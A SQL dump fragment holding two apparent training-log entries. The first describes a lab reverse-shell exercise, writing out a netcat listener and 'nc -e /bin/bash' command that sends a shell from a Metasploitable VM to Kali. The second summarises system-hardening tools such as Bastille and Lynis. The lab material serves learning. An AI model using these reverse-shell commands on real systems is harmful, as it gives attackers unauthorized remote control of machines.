(416, 383, 42, '<p><strong>Reverse Shell:</strong></p>\r\n\r\n<p>In a typical remote system access scenario, the user is the client and the target machine is the server. The user initiates a remote shell connection and the target system listens for such connections.</p>\r\n\r\n<p>With a reverse shell, the roles are opposite. It is the target machine that initiates the connection to the user, and the user&rsquo;s computer listens for incoming connections on a specified port.</p>\r\n\r\n<p>In Reverse shell, we make our attacking machine to be listening on a specific port</p>\r\n\r\n<p>And will initiate the connection from the target machine.</p>\r\n\r\n<p>&nbsp;I&#39;ve set the host Kali Linux to be listening on port 192</p>\r\n\r\n<p>Using the command</p>\r\n\r\n<p>nc -lnvp 192 -s 10.0.2.4</p>\r\n\r\n<p>Here Ip address is of the host.</p>\r\n\r\n<p><em>(Screenshot- 861)</em></p>\r\n\r\n<p><strong>Now in the Metasploitable</strong></p>\r\n\r\n<p>I initiated a connection for an outgoing remote shell to the listening port of the attacker i.e 192</p>\r\n\r\n<p>Command was- nc -e /bin/bash 10.0.2.4 192</p>\r\n\r\n<p><em>(Screenshot- 862)</em></p>\r\n\r\n<p>By executing the above command I didn&#39;t get any output.</p>\r\n\r\n<p>I then jumped to our host Kali Linux where under the listening section I tried entering whoami(o/p- msfadmin), ls commands <em>(Screenshot- 861)</em></p>\r\n\r\n<p>And the commands were executed successfully. Hence we can say that we have access to the cli of a remote machine without using any Attack i.e Reverse Shell</p>\r\n', '<p>There was some problem with the Metasploitable virtual machine.</p>\r\n\r\n<p>Which then needed redownloading&nbsp;and set up&nbsp;</p>\r\n', '<ul>\r\n	<li>How to set up Reverse Shell.</li>\r\n	<li>Gaining access to CLI of a remote machine without any attack</li>\r\n</ul>\r\n', '', '2021-09-29', '2021-09-30', 1, '5', 'Y', 0, '2021-09-30 06:41:14', '1970-01-01', '28', '', 'N', 'N', 'N', 'N'),
(417, 384, 42, '<p><strong>Bastille:</strong><br />\r\nThis is an interactive system-hardening open source program. It bundles a variety of system-hardening options into a single easy-to-use package.</p>\r\n\r\n<p>Bastille can be employed to harden a number of platforms and distributions including Red Hat and Red Hat Enterprise, SUSE, Mandriva, Gentoo, Fedora Core, Debian and TurboLinux.</p>\r\n\r\n<p>It is also supported on HP-UX and, in beta, on OS X. It is a collection of PERL scripts that create a custom security configuration based on the answers provided by the administrator to a specific set of questions.</p>\r\n\r\n<p>It also does an in-depth analysis of the systems current hardening level and its various security loopholes, thereby decreasing the chances of the system getting compromised.<br />\r\n&nbsp;</p>\r\n\r\n<p><strong>Lynis:</strong><br />\r\nThis is an open source security audit tool that can perform server hardening and vulnerability scanning of UNIX and Linux based servers.</p>\r\n\r\n<p>Lynis performs an extensive set of individual tests based on security guidelines to assess the security level of the system. It scans the system and available software to detect security issues.</p>\r\n\r\n<p>Besides security related information, it also scans for general system information, installed packages and configuration vulnerabilities. The tool is written in shell script and, hence, can be easily used on most systems.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>Microsoft Attack Surface Analyzer:</strong><br />\r\nThis is a free tool developed by Microsoft. It aims at analysing the changes made to the attack surface of the system (on the installation of software) by analysing the registry, file permissions, Windows IIS server, GAC assemblies, etc.</p>\r\n\r\n<p>It assesses the severity of the change in the attack surface and its implications on the vulnerability of the system. A proper categorisation of the analysed threats by the attack surface analyser under specific labels ensures a better understanding of the generated report.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>Microsoft SDL Threat Modelling Tool:</strong><br />\r\nMicrosoft developed this tool with the aim of incorporating threat modelling as part of the standard software development lifecycle.</p>\r\n\r\n<p>The current version of the tool provides enhanced features like better visualisation and customisation features, updated threat definitions, etc.</p>\r\n\r\n<p>The use of this tool significantly reduces the efforts required to identify security vulnerabilities and helps users take the necessary measures to counter them in the early stages of the SDL (software development lifecycle).</p>\r\n', '<p>-</p>\r\n', '<ul>\r\n	<li>Different IT Security Hardening tools that may be useful</li>\r\n</ul>\r\n', '', '2022-01-10', '2022-01-13', 1, '5', 'Y', 0, '2022-01-13 06:44:13', '1970-01-01', '28', '', 'N', 'N', 'N', 'N'),
